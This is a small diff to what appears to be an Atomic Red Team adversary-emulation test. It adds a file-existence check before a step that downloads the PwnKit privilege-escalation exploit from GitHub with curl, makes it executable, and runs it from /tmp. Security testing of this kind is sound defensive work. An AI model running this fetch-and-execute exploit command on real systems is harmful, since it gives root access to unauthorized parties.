@@ -17,7 +17,7 @@ atomic_tests:
       name: sh
       command: |-
         cd /tmp
-        curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
+        test -f PwnKit || curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
         chmod +x ./PwnKit || exit
         (sleep 1 && rm ./PwnKit & )
         ./PwnKit
